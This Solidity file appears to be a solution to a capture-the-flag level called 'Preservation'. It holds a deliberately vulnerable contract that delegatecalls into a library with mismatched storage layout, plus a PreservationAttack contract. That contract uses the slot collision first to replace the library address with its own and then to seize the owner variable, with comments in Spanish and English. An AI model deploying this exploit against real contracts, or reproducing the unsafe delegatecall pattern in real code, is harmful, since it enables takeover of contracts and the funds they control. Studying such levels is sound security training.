// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* LibraryContract deberia de seguir el mismo orden a la hora de establecer los variables de estado.
Al hacer delegateCall, en SM "Preservation", en lugar de modificar el "storedTime", se modificara el slot0 -> "timeZone1Library"
 */

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;

    function timeZone1Library() external returns (address);

    function owner() external returns (address);
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    /* address = 20bytes --- uint160 = 20bytes */
    // ... = uint160(address(0x85732427df4874db73600685072D54b99e72C9cA));
    uint thisAddress = uint(uint160(address(this)));

    IPreservation PreservationContract =
        IPreservation(0xCC4AE41d4D4f2dCaAC3b03A9A7d33A14f29f48f0);

    address public check_timeZoneAfterChange;
    address public check_ownerAfterChange;

    function viewww() public view returns (uint) {
        return thisAddress;
    }

    function view_timeZoneAfterChange() public view returns (address) {
        return check_timeZoneAfterChange;
    }

    function view_ownerAfterChange() public view returns (address) {
        return check_ownerAfterChange;
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }

    function attackPreservation1() external {
        /* we change delegateCall is calling destination contract */
        // attackVar -> uint
        PreservationContract.setFirstTime(thisAddress);

        // /* vamos a ver el resultado */
        check_timeZoneAfterChange = PreservationContract.timeZone1Library();
    }

    function attackPreservation2() external {
        /* HERE -> now this contract will be called when using delegateCall at setFirstTime() at Preservation contract */
        /* we call same setTime() function, but instead of in "Preservation" in this contract, now storage variables are defined in order so we can change owner */
        uint randomNum = 123123123; // not used
        PreservationContract.setFirstTime(randomNum);
        check_ownerAfterChange = PreservationContract.owner();
    }
}

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    /* @remind si es posible que se escriba en el contrato "Preservation" la 1era variable address (desde este contrato), cuando en este contrato es typo uint256 */
    function setTime(uint _time) public {
        storedTime = _time;
    }
}
